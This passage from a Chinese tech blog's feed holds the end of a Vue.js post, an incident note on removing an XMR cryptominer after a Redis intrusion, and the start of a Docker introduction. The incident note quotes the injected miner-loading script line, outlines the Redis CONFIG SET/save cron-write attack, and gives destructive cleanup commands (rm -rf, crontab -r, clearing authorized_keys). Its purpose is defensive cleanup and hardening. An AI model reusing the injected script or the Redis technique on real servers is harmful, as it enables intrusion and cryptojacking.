  template: &lt;span style=&quot;color: #ffd866;&quot;&gt;'&amp;lt;div&amp;gt;&amp;#36825;&amp;#26159;template&amp;#23646;&amp;#24615;&amp;#27169;&amp;#26495;&amp;#28210;&amp;#26579;&amp;#12290;&amp;lt;/div&amp;gt;'&lt;/span&gt;,
  &lt;span style=&quot;color: #a9dc76;&quot;&gt;render&lt;/span&gt;: &lt;span style=&quot;color: #ff6188;&quot;&gt;function&lt;/span&gt;(&lt;span style=&quot;color: #fcfcfa;&quot;&gt;h&lt;/span&gt;){
    &lt;span style=&quot;color: #ff6188;&quot;&gt;return&lt;/span&gt; h(&lt;span style=&quot;color: #ffd866;&quot;&gt;'div'&lt;/span&gt;, {}, &lt;span style=&quot;color: #ffd866;&quot;&gt;'&amp;#36825;&amp;#26159;render&amp;#23646;&amp;#24615;&amp;#26041;&amp;#24335;&amp;#28210;&amp;#26579;&amp;#12290;'&lt;/span&gt;)
  }
})
&lt;span style=&quot;color: #ff6188;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #78dce8;&quot;&gt;Vue&lt;/span&gt;({
  el: &lt;span style=&quot;color: #ffd866;&quot;&gt;'.vapp-2'&lt;/span&gt;,
  data: {
    info: &lt;span style=&quot;color: #ffd866;&quot;&gt;'&amp;#36825;&amp;#26159;&amp;#36890;&amp;#36807;el&amp;#23646;&amp;#24615;&amp;#33719;&amp;#21462;&amp;#25346;&amp;#36733;&amp;#20803;&amp;#32032;&amp;#30340;outerHTML&amp;#26041;&amp;#24335;&amp;#28210;&amp;#26579;&amp;#12290;'&lt;/span&gt;
  },
  template: &lt;span style=&quot;color: #ffd866;&quot;&gt;'&amp;lt;div&amp;gt;&amp;#36825;&amp;#26159;template&amp;#23646;&amp;#24615;&amp;#27169;&amp;#26495;&amp;#28210;&amp;#26579;&amp;#12290;&amp;lt;/div&amp;gt;'&lt;/span&gt;
})
&lt;span style=&quot;color: #ff6188;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #78dce8;&quot;&gt;Vue&lt;/span&gt;({
  el: &lt;span style=&quot;color: #ffd866;&quot;&gt;'.vapp-3'&lt;/span&gt;,
  data: {
    info: &lt;span style=&quot;color: #ffd866;&quot;&gt;'&amp;#36825;&amp;#26159;&amp;#36890;&amp;#36807;el&amp;#23646;&amp;#24615;&amp;#33719;&amp;#21462;&amp;#25346;&amp;#36733;&amp;#20803;&amp;#32032;&amp;#30340;outerHTML&amp;#26041;&amp;#24335;&amp;#28210;&amp;#26579;&amp;#12290;'&lt;/span&gt;
  }
})
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org6ceca91&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org6ceca91&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 独立构建和运行时构建&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
ue.js 1.0，编译器需要依赖浏览器的DOM，所以无法将编译器和运行时分开。因此在Vue.js 1.0分发包中，编译器和运行时是打包在一起，都在浏览器端执行。
Vue.js 2.0，为了支持服务端渲染(server-side rendering)，编译器不能依赖浏览器的DOM，所以必须将编译器和运行时分开。于是形成了独立构建（编译器 + 运行时）和运行时构建（仅运行时）。显而易见，运行时构建体积要小于独立构建。
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
1. 模板编译器
模板编译器的职责是将模板字符串编译为纯JavaScript的渲染函数，即将&amp;lt;template&amp;gt;编译成render函数。
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
2. Vue.js的执行过程
包含编译过程和运行过程，在编译过程，编译器将字符串模板(template)编译为渲染函数(render)，在运行过程，调用渲染函数。
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
3. 运行时构建
运行时构建指不能进行模板编译的Vue库。运行时构建不包含模板编译器，即不支持template选项，如果使用vue-loader和vueify预编译模板，只需要打包运行时，而不需要打包编译器。
运行时构建，可以用render选项，但它只在单文件组件中起作用，因为单文件组件的模板是在构建时预编译到render函数中，运行时构建只有独立构建大小的30%，只有16Kb min+gzip大小。
&lt;/pre&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-javascript&quot; id=&quot;orgf06216b&quot;&gt;&lt;span style=&quot;color: #727072;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;&amp;#19981;&amp;#38656;&amp;#35201;&amp;#32534;&amp;#35793;&amp;#22120;&lt;/span&gt;
&lt;span style=&quot;color: #ff6188;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #78dce8;&quot;&gt;Vue&lt;/span&gt;({
  render (h) {
    &lt;span style=&quot;color: #ff6188;&quot;&gt;return&lt;/span&gt; h(&lt;span style=&quot;color: #ffd866;&quot;&gt;'div'&lt;/span&gt;, &lt;span style=&quot;color: #ab9df2;&quot;&gt;this&lt;/span&gt;.hello)
  }
})
&lt;/pre&gt;
&lt;/div&gt;

&lt;pre class=&quot;example&quot;&gt;
4. 独立构建
独立构建指能够将template模板或者从el挂载元素提取的模板编译成渲染函数的Vue库，独立构建包含模板编译器，可以用template选项实时编译模板。
&lt;/pre&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-javascript&quot; id=&quot;org8c352d2&quot;&gt;&lt;span style=&quot;color: #727072;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;&amp;#38656;&amp;#35201;&amp;#32534;&amp;#35793;&amp;#22120;&lt;/span&gt;
&lt;span style=&quot;color: #ff6188;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #78dce8;&quot;&gt;Vue&lt;/span&gt;({
  template: &lt;span style=&quot;color: #ffd866;&quot;&gt;'&amp;lt;div&amp;gt;&amp;lt;/div&amp;gt;'&lt;/span&gt;
})
&lt;/pre&gt;
&lt;/div&gt;
&lt;pre class=&quot;example&quot;&gt;
使用vue-cli生成项目时，会提醒使用哪种构建方式，npm包默认导出的是运行时构建，即runtime版本vue.runtime.common.js，如果想使用独立构建，需要在webpack.config.js中配置alias。
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1417eb4&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org1417eb4&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; References&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/camille666/p/vue_instance_prop_el_template_render.html&quot;&gt;el，template，render属性优先性&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="Vue.js" /><summary type="html">感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！</summary></entry><entry><title type="html">XMR 恶意挖矿脚本处理笔记</title><link href="http://localhost:4000/linux/2018/12/27/xmr%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0/" rel="alternate" type="text/html" title="XMR 恶意挖矿脚本处理笔记" /><published>2018-12-27T00:00:00+08:00</published><updated>2018-12-27T00:00:00+08:00</updated><id>http://localhost:4000/linux/2018/12/27/xmr%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0</id><content type="html" xml:base="http://localhost:4000/linux/2018/12/27/xmr%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0/">&lt;p&gt;
感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
&lt;/p&gt;

&lt;div id=&quot;outline-container-org9d7ea93&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org9d7ea93&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; 事件描述&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org5d883cb&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org5d883cb&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; 概况&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
服务器安装系统为 CentOS 7，服务器用户一直采用密钥登录，通过用户登入攻击的可能性几乎为零。
服务器上所有站点使用宝塔面板面板管理，所以可能性是通过攻破了宝塔面板进入，然后注入恶意挖矿脚本的。
网站无法加载，会出现浏览器卡死的情况。
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1cef11d&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org1cef11d&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 表象&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
下面陈述被攻击后的表象：
&lt;/pre&gt;

&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;服务器资源被大量占用，资源占用率飙升；&lt;/li&gt;
&lt;li&gt;服务器所有JS文件被篡改，向输出页面增加了一个script标签（document.write('&amp;lt;script src=&quot;&lt;a href=&quot;http://t.cn/EvlonFh&quot;&gt;http://t.cn/EvlonFh&lt;/a&gt;&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;OMINEId(&quot;e02cf4ce91284dab9bc3fc4cc2a65e28&quot;,&quot;-1&quot;)&amp;lt;/script&amp;gt;');）&lt;/li&gt;
&lt;li&gt;网站无法加载，会出现浏览器卡死的情况&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1e76d21&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org1e76d21&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 问题排查及解决&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgfaf8000&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgfaf8000&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.1&lt;/span&gt; 排查&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. 访问服务器上运行的站点（包括宝塔面板），F12，发现不停访问一个wss的地址（wss://xmr.omine.org:8181/），并且很慢。
2. 搜索这个地址，得知此为 XMR 恶意挖矿脚本。
3. 查看系统任务计划，发现定期恶意脚本的计划内容
# crontab -l
4. 由于redis没有安全配置，黑客利用redis安全漏洞入侵了服务器。
攻击者通过redis命令 config set与save完成入侵过程.使用redis-cli -h &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt; 登录服务redis-server，
将redis的数据文件改到/var/spool/cron/root文件中，再通save 命令将定时任务shell脚本写入到/var/spool/cron/root 中，
完成定时执行shell脚本，来实现提权及其它操作。
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf9c48e2&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgf9c48e2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.2&lt;/span&gt; 解决&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-2&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. 整理清理脚本
&lt;/pre&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgcda5437&quot;&gt;&lt;span style=&quot;color: #727072;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;&amp;#20808;&amp;#20851;&amp;#25481;redis&amp;#31471;&amp;#21475;&lt;/span&gt;
iptables -A INPUT -p tcp --dport 6379 -j DROP
&lt;span style=&quot;color: #727072;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;&amp;#28165;&amp;#29702;&amp;#23450;&amp;#26102;&amp;#20219;&amp;#21153;&lt;/span&gt;
crontab -r
&lt;span style=&quot;color: #727072;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;&amp;#28165;&amp;#38500;redis key Back1 Back3 Back3&lt;/span&gt;
redis-cli -h xxx.xxx.xxx.xxx -x del Back1
redis-cli -h xxx.xxx.xxx.xxx -x del Back2
redis-cli -h xxx.xxx.xxx.xxx -x del Back3
redis-cli -h xxx.xxx.xxx.xxx -x CONFIG SET dbfilename dump.rdb
redis-cli -h xxx.xxx.xxx.xxx -x CONFIG SET dir /tmp
redis-cli -h xxx.xxx.xxx.xxx -x save
&lt;span style=&quot;color: #727072;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;&amp;#28165;&amp;#29702;&amp;#36816;&amp;#34892;&amp;#33050;&amp;#26412;&lt;/span&gt;
&lt;span style=&quot;color: #ab9df2;&quot;&gt;kill&lt;/span&gt; -9 &lt;span style=&quot;color: #fa8072;&quot;&gt;`ps -ef|grep shz.sh|grep -v grep|awk '{print $2}'`&lt;/span&gt;
&lt;span style=&quot;color: #ab9df2;&quot;&gt;kill&lt;/span&gt; -9 &lt;span style=&quot;color: #fa8072;&quot;&gt;`ps -ef|grep zigw|grep -v grep|awk '{print $2}'`&lt;/span&gt;
&lt;span style=&quot;color: #ab9df2;&quot;&gt;kill&lt;/span&gt; -9 &lt;span style=&quot;color: #fa8072;&quot;&gt;`ps -ef|grep cmd|grep -v grep|awk '{print $2}'`&lt;/span&gt;
chattr -i /etc/zigw
chattr -i /etc/shz.sh
chattr -i /tmp/zigw
chattr -i /tmp/shz.sh
rm -rf /etc/shz.sh
rm -rf /etc/gmbpr2
rm -rf /etc/zigw
rm -rf /tmp/zigw
rm -rf /tmp/shz.sh
rm -rf ~/.cmd

&lt;span style=&quot;color: #727072;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;&amp;#28165;&amp;#29702;SSH&amp;#20813;&amp;#30331;&amp;#24405;&amp;#20449;&amp;#24687;&lt;/span&gt;
cat /dev/null&amp;gt; ~/.ssh/authorized_keys
&lt;span style=&quot;color: #727072;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;&amp;#28165;&amp;#29702;js&amp;#33050;&amp;#26412;&lt;/span&gt;
find / -name &lt;span style=&quot;color: #ffd866;&quot;&gt;'*.js'&lt;/span&gt;|xargs grep -L f4ce9|xargs sed -i &lt;span style=&quot;color: #ffd866;&quot;&gt;'$d'&lt;/span&gt;
mv /usr/bin/get /usr/bin/wget
mv /usr/bin/url /usr/bin/curl
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgd2852b8&quot;&gt;&lt;span style=&quot;color: #727072;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;!/bin/&lt;/span&gt;&lt;span style=&quot;color: #ff6188;&quot;&gt;bash&lt;/span&gt;
&lt;span style=&quot;color: #727072;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;By xzeu&lt;/span&gt;
&lt;span style=&quot;color: #727072;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;http://www.xzeu.com&lt;/span&gt;
&lt;span style=&quot;color: #727072;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;Email: admin#xzeu.com&lt;/span&gt;
&lt;span style=&quot;color: #727072;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;Filename: clearlink.sh&lt;/span&gt;

&lt;span style=&quot;color: #727072;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;Begin&lt;/span&gt;
find / -type f -name &lt;span style=&quot;color: #ffd866;&quot;&gt;'*.js'&lt;/span&gt; |xargs fgrep -s -l &lt;span style=&quot;color: #ffd866;&quot;&gt;&quot;e02cf4ce91284dab9bc3fc4cc2a65e28&quot;&lt;/span&gt;|xargs ls -l |awk &lt;span style=&quot;color: #ffd866;&quot;&gt;'{print $9}'&lt;/span&gt;&amp;gt;jsfile.txt
&lt;span style=&quot;color: #ff6188;&quot;&gt;for&lt;/span&gt; file&lt;span style=&quot;color: #ff6188;&quot;&gt; in&lt;/span&gt; &lt;span style=&quot;color: #fa8072;&quot;&gt;`cat ~/jsfile.txt`&lt;/span&gt;;
&lt;span style=&quot;color: #ff6188;&quot;&gt;do&lt;/span&gt;
  &lt;span style=&quot;color: #ab9df2;&quot;&gt;echo&lt;/span&gt; $&lt;span style=&quot;color: #fcfcfa;&quot;&gt;file&lt;/span&gt;
  &lt;span style=&quot;color: #727072;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;sed -i '/e02cf4ce91284dab9bc3fc4cc2a65e28/d' $file&lt;/span&gt;
  &lt;span style=&quot;color: #727072;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;cp $file ${file}.bad&lt;/span&gt;
&lt;span style=&quot;color: #ff6188;&quot;&gt;done&lt;/span&gt;

&lt;span style=&quot;color: #ff6188;&quot;&gt;exit&lt;/span&gt; 0
&lt;span style=&quot;color: #727072;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;END&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;

&lt;pre class=&quot;example&quot;&gt;
2. 恢复服务器中的js文件(其中grep的参数为小写的L)
方法一：删除站点所有感染 js 文件，从代码仓库pull，重新上传部署。
方法二：# find / -name '*.js' | xargs grep -l f4ce9 | xargs sed -i '/f4ce9/d'
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orged83ba8&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orged83ba8&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.3&lt;/span&gt; 预防&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-3&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. 限制内网访问，或者只限制本机访问
只监听内网的IP，然后在iptables里面限制访问的主机：在/etc/redis/redis.conf中配置如下：
bind 192.168.1.100
如果服务只需要本机访问就直接监听127.0.0.1的回环地址就可以了。
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
2. 设置防火墙
如果需要其他机器访问，或者设置了slave模式，那就记得加上相应的防火墙设置，命令如下：
iptables -A INPUT -s 192.168.1.100/32 -p tcp --dport 6379 -j ACCEPT
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
3. 禁止root用户启动redis
使用root权限去运行网络服务是比较有风险的（nginx和apache都是有独立的work用户，而redis没有）。
edis crackit 漏洞就是利用root用户的权限来替换或者增加authorized_keys，来获取root登录权限的。
使用root切换到redis用户启动服务:
useradd -s /sbin/nolog -M redissetsid sudo -u redis /usr/bin/redis-server /etc/redis/redis.conf
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
4. 限制redis文件目录访问权限
设置redis的主目录权限为700,如果redis配置文件独立于redis主目录,权限修过为600,因为redis密码明文存储在配置文件中。
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
5. 避免使用熟知的端口,降低被初级扫描的风险
在/etc/redis/redis.conf中配置如下：
找到port 6379这行，把6379改为9999，记得iptables对应的端口要修改
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
6. 开启redis密码认证,并设置高复杂度密码
redis在redis.conf配置文件中，设置配置项requirepass， 开户密码认证。
redis因查询效率高，auth这种命令每秒能处理10w次以上，简单的redis的密码极容易为攻击者暴破。 
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
7. 禁用或者重命名危险命令
edis crackit漏洞就利用config/save两个命令完成攻击 。 因redis无用户权限限制，建议危险的命令，
使用rename配置项进行禁用或重命名，这样外部不了解重命名规则攻击者，就不能执行这类命令。涉及到的命令：
FLUSHDB, FLUSHALL, KEYS, PEXPIRE, DEL, CONFIG, SHUTDOWN, BGREWRITEAOF, BGSAVE, SAVE, SPOP, SREM, RENAME, DEBUG, EVAL`
以下示例：redis.config文件禁用FLUSHDB、FLUSHALL两个命令；重命名CONFIG、SHUTDOWN命令，添加一个特殊的后缀。
这样redis启动后，只能运行CONFIG_b9fc8327c4dee7命令，不能执行CONFIG命令。
rename-command CONFIG CONFIG_des327c4dee7dfsf
rename-command SHUTDOWN SHUTDOWN_des327c4dee7dfsf
rename-command FLUSHDB &quot;&quot;
rename-command FLUSHALL &quot;&quot;
上述配置将config，flushdb，flushall设置为了空，即禁用该命令，我们也可以命名为一些攻击者难以猜测，
我们自己却容易记住的的名字。保存之后，执行/etc/init.d/redis-server restart 重启生效。
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org59cde88&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org59cde88&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; 参考&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/Rebybyx/p/9913779.html&quot;&gt;XMR恶意挖矿脚本处理笔记&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.freebuf.com/articles/system/186743.html&quot;&gt;XMR恶意挖矿案例简析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.xzeu.com/index.php/archives/120/&quot;&gt;Redis未授权访问缺陷,服务器变矿机&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="比特币" /><category term="恶意挖矿" /><category term="病毒" /><summary type="html">感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！</summary></entry><entry><title type="html">Docker notes</title><link href="http://localhost:4000/%E8%99%9A%E6%8B%9F%E5%8C%96/2018/12/12/docker/" rel="alternate" type="text/html" title="Docker notes" /><published>2018-12-12T00:00:00+08:00</published><updated>2018-12-12T00:00:00+08:00</updated><id>http://localhost:4000/%E8%99%9A%E6%8B%9F%E5%8C%96/2018/12/12/docker</id><content type="html" xml:base="http://localhost:4000/%E8%99%9A%E6%8B%9F%E5%8C%96/2018/12/12/docker/">&lt;p&gt;
感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
&lt;/p&gt;

&lt;div id=&quot;outline-container-org7933212&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org7933212&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;1&lt;/span&gt; Docker 简介&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org64cd631&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org64cd631&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.1&lt;/span&gt; Docker 是什么&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
Docker 是个划时代的开源项目，它彻底释放了计算虚拟化的威力，极大提高了应用的维护效率，降低了云计算应用开发的成本！使用 Docker，可以让应用的部署、测试和分发都变得前所未有的高效和轻松！
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
无论是应用开发者、运维人员、还是其他信息技术从业人员，都有必要认识和掌握 Docker，节约有限的生命。
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9aa5b5d&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org9aa5b5d&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;1.2&lt;/span&gt; 为什么要用 Docker&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-1-2&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;更高效的利用系统资源&lt;/li&gt;
&lt;li&gt;更快速的启动时间&lt;/li&gt;
&lt;li&gt;一致的运行环境&lt;/li&gt;
&lt;li&gt;持续交付和部署&lt;/li&gt;
&lt;li&gt;更轻松的迁移&lt;/li&gt;
&lt;li&gt;更轻松的维护和扩展&lt;/li&gt;
&lt;li&gt;对比传统虚拟机总结&lt;/li&gt;
&lt;/ul&gt;
&lt;table border=&quot;2&quot; cellspacing=&quot;0&quot; cellpadding=&quot;6&quot; rules=&quot;groups&quot; frame=&quot;hsides&quot;&gt;


&lt;colgroup&gt;
&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;

&lt;col  class=&quot;org-left&quot; /&gt;
&lt;/colgroup&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;特性&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;容器&lt;/th&gt;
&lt;th scope=&quot;col&quot; class=&quot;org-left&quot;&gt;虚拟机&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;启动&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;秒级&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;分钟级&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;硬盘使用&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一般为 MB&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一般为 GB&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;性能&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;接近原生&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;弱于&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td class=&quot;org-left&quot;&gt;系统支持量&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;单机支持上千个容器&lt;/td&gt;
&lt;td class=&quot;org-left&quot;&gt;一般几十个&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org15f3b20&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org15f3b20&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;2&lt;/span&gt; 基本概念&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org0a784a6&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org0a784a6&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;2.1&lt;/span&gt; 镜像&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-2-1&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. Docker 镜像
&lt;/pre&gt;

&lt;p&gt;
Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:18.04 就包含了完整的一套 Ubuntu 18.04 最小系统的 root 文件系统。
Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。
&lt;/p&gt;

&lt;pre class=&quot;example&quot;&gt;
2. 分层存储
&lt;/pre&gt;

&lt;p&gt;
Docker 利用了 &lt;a href=&quot;https://en.wikipedia.org/wiki/Union_mount&quot;&gt;Union FS&lt;/a&gt; 的技术，将其设计为分层存储的架构。所以严格来说，镜像并非是像一个 ISO 那样的打包文件，镜像只是一个虚拟的概念，其实际体现并非由一个文件组成，而是由一组文件系统组成，或者说，由多层文件系统联合组成。
镜像构建时，会一层层构建，前一层是后一层的基础。在构建镜像的时候，需要额外小心，每一层尽量只包含该层需要添加的东西，任何额外的东西应该在该层构建结束前清理掉。
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org944ecbb&quot; class=&quot;outline-3&quot;&gt;
